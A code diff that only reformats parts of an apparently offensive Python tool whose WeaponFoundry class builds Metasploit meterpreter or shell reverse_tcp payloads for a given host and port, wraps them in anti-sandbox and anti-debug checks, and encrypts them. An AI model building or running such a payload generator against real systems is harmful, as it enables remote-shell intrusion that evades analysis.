@@ -254,8 +254,7 @@ class EncryptionEngine:
 
         if method == EncryptionMethod.RC4:
             warnings.warn(
-                "RC4 is cryptographically weak and deprecated. "
-                "Prefer AES or ChaCha20 for new payloads.",
+                "RC4 is cryptographically weak and deprecated. Prefer AES or ChaCha20 for new payloads.",
                 DeprecationWarning,
                 stacklevel=2,
             )
@@ -857,11 +856,7 @@ class WeaponFoundry:
         if not MetasploitIntegrator.is_available():
             return ""
 
-        msf_payload = (
-            "meterpreter/reverse_tcp"
-            if shell_type == ShellType.REVERSE_TCP
-            else "shell/reverse_tcp"
-        )
+        msf_payload = "meterpreter/reverse_tcp" if shell_type == ShellType.REVERSE_TCP else "shell/reverse_tcp"
         arch = "x64"
         platform = (
             "windows"
@@ -870,7 +865,12 @@ class WeaponFoundry:
         )
 
         raw_bytes = self.msf_integrator.generate_payload(
-            platform, arch, msf_payload, lhost, lport, "raw",
+            platform,
+            arch,
+            msf_payload,
+            lhost,
+            lport,
+            "raw",
         )
 
         if raw_bytes and output_format == PayloadFormat.PYTHON:
@@ -904,7 +904,11 @@ class WeaponFoundry:
         # Add anti-analysis if requested
         if anti_sandbox or anti_debug or sleep_seconds > 0:
             base_payload = self._add_anti_analysis(
-                base_payload, output_format, anti_sandbox, anti_debug, sleep_seconds,
+                base_payload,
+                output_format,
+                anti_sandbox,
+                anti_debug,
+                sleep_seconds,
             )
 
         # Encrypt payload
